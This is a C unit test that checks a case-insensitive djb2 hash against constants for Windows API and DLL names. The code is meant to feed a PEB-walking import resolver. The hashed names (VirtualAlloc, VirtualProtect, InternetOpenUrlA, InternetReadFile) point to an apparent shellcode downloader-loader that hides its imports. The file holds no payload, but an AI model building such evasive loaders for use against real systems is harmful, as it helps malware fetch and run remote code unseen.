/*
 * Unit test: djb2i_ascii matches precomputed constants in hash.h.
 *
 * Run on Linux host for fast feedback. Locks in the hash contract
 * before the PEB walker depends on H_* constants.
 */

#include <stdio.h>
#include <stdint.h>
#include "../src/hash.h"

static int failures = 0;

static void check(const char *s, uint32_t expected) {
    uint32_t got = djb2i_ascii(s);
    if (got != expected) {
        fprintf(stderr, "FAIL: %-24s got=0x%08x expected=0x%08x\n",
                s, got, expected);
        failures++;
    } else {
        printf("OK:   %-24s = 0x%08x\n", s, got);
    }
}

int main(void) {
    check("VirtualAlloc",        H_VIRTUALALLOC);
    check("VirtualProtect",      H_VIRTUALPROTECT);
    check("VirtualFree",         H_VIRTUALFREE);
    check("Sleep",               H_SLEEP);
    check("GetTickCount",        H_GETTICKCOUNT);
    check("InternetOpenA",       H_INTERNETOPENA);
    check("InternetOpenUrlA",    H_INTERNETOPENURLA);
    check("InternetReadFile",    H_INTERNETREADFILE);
    check("InternetCloseHandle", H_INTERNETCLOSEHANDLE);
    check("ExitProcess",         H_EXITPROCESS);
    check("LoadLibraryA",        H_LOADLIBRARYA);
    check("kernel32.dll",        H_KERNEL32_DLL);
    check("kernelbase.dll",      H_KERNELBASE_DLL);
    check("wininet.dll",         H_WININET_DLL);
    check("ntdll.dll",           H_NTDLL_DLL);

    /* Case-insensitivity sanity check */
    check("KERNEL32.DLL",        H_KERNEL32_DLL);
    check("kErNeL32.DlL",        H_KERNEL32_DLL);
    check("VIRTUALALLOC",        H_VIRTUALALLOC);

    /* UTF-16 wide variant (as PEB would supply) */
    {
        const uint16_t w[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
        uint32_t h = djb2i_wide(w, 12);
        if (h != H_KERNEL32_DLL) {
            fprintf(stderr, "FAIL: djb2i_wide(kernel32.dll) got=0x%08x\n", h);
            failures++;
        } else {
            printf("OK:   djb2i_wide(kernel32.dll)  = 0x%08x\n", h);
        }
    }

    if (failures) {
        fprintf(stderr, "\n%d test(s) failed\n", failures);
        return 1;
    }
    printf("\nAll hash tests passed.\n");
    return 0;
}
